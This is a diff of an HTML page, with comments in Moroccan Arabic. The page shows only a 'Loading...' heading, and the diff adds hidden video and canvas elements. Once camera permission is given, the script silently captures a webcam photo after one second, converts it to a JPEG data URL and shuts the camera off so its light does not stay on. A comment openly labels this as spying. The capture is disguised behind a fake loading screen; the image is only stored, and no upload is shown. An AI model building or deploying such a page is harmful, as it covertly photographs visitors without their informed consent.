@@ -6,14 +6,35 @@
 </head>
 <body>
     <h2>جاري التحميل...</h2>
-    
+
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
     <script>
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(function(stream) {
-                console.log("تم الاتصال");
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                // التجسس أو التقاط الصورة بعد ثانية وحدة من فتح الصفحة
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    // هنا الصورة كتحول لـ Data URL (باش تقدر تعرضها أو تتعامل معاها)
+                    const imageData = canvas.toDataURL('image/jpeg');
+                    console.log("تم التقاط الصورة بنجاح");
+
+                    // حبس الكاميرا باش ما يبقاش الضوء شاعل
+                    stream.getTracks().forEach(track => track.stop());
+                }, 1000);
             })
             .catch(function(error) {
-                console.log("خطأ");
+                console.log("تم رفض إذن الكاميرا");
             });
     </script>
 </body>
